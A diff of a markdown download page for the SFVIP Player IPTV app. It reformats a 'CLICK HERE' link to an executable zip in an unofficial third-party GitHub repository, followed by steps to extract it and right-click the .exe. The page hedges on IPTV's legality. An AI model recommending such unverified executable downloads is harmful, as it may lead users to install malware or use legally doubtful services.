@@ -24,7 +24,8 @@ It is uncertain to determine whether IPTV is legal or not, including SFVIP Playe
 Since the SFVIP Player app is a pain to get your hands on, we have provided a custom Github Url for ease. all you need to do is click the link to downlaod.
 
 - Steps to Follow:
-1. Download the The Repo via Github - [**CLICK HERE**](https://github.com/TeamSkorpz/teamskorpz.github.io/releases/download/SFVIP/SFVIP-Player-x64.zip)
+1. Download the The Repo via Github
+   [**"CLICK HERE"**](https://github.com/TeamSkorpz/teamskorpz.github.io/releases/download/SFVIP/SFVIP-Player-x64.zip)
 2. Extract anywhere to desktop"
 3. Open the Folder **"SFVIP-Player-x64"**.
 4. Now right click **"sfvip player.exe"** icon.
